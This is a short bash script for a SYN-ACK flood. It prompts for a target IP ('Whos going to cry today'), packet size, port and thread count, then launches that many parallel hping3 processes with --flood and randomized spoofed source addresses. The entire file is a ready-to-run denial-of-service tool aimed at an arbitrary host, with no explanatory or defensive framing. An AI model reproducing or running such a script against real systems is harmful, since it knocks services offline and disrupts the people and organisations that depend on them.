#! /bin/bash

echo "###################### IP SYN-ACK FLOOD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PACKET SIZE:
read packet
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS ######################"
#packet=$1
#port=$2
#count=$3

for i in `seq 1 $count`;
 do
  hping3 $tarip -S -A -d $packet -p $port --flood -I eth1 --rand-source &
 done
